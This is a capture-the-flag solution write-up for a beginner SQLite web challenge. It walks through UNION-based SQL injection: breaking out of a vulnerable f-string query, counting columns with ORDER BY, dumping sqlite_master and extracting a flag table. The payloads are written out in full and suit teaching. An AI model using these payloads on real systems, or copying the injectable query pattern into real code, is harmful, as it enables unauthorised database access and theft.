# Solution Writeup: Simple Search (SQLi)

This is a beginner-friendly Web challenge demonstrating a classic **UNION-based SQL Injection (SQLi)** vulnerability in an SQLite-backed application.

## Vulnerability Analysis

The search box takes input and injects it directly into a SQL query string without parameterization or filtering inside `app.py`:

```python
sql_query = f"SELECT name, description FROM products WHERE name LIKE '%{query}%'"
```

Since the query string is enclosed in single quotes (`'`) and wildcards (`%`), we can break out of the string structure and inject our own SQL commands.

---

## Step-by-Step Exploitation

### Step 1: Detect SQL Injection
Enter a single quote `'` in the search box and press search.
The application displays the SQLite error:
```
unrecognized token: "'%'"
```
This confirms that our input is directly integrated into the database query and causes a syntax error when unbalanced.

---

### Step 2: Determine Column Count
To perform a `UNION` exploit, our injected `SELECT` statement must return the **exact same number of columns** as the original query.
Let's find the number of columns using the `ORDER BY` clause.

- Search: `a' ORDER BY 1--` -> Works (at least 1 column)
- Search: `a' ORDER BY 2--` -> Works (at least 2 columns)
- Search: `a' ORDER BY 3--` -> SQLite Error: `1st ORDER BY term out of range - should be between 1 and 2`

This tells us the original query selects exactly **2 columns**.

---

### Step 3: Enumerate Database Tables (SQLite Schema)
In SQLite, database metadata is stored in a special built-in table named `sqlite_master`.
We can query this table to find names of other tables:

- **Payload:**
  ```sql
  a' UNION SELECT tbl_name, sql FROM sqlite_master--
  ```

Submit this payload into the text box. The page will return the list of tables and their schema!
In the table results, you will notice:
1. `products` table
2. **`flag_store`** table

The schema for `flag_store` is shown as:
```sql
CREATE TABLE flag_store (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    flag TEXT NOT NULL
)
```

---

### Step 4: Retrieve the Flag
Now that we know the table name is `flag_store` and the column is `flag`, we can perform a UNION query to extract it.
Since the original query expects 2 columns, we can select the `flag` column as the first value and `NULL` (or a placeholder string) as the second value.

- **Payload:**
  ```sql
  a' UNION SELECT flag, 'placeholder' FROM flag_store--
  ```

Submit this payload. The search result table will print the flag!

**Flag Example:**
`flag{sqli_local_test_dynamic_flag_1234}`
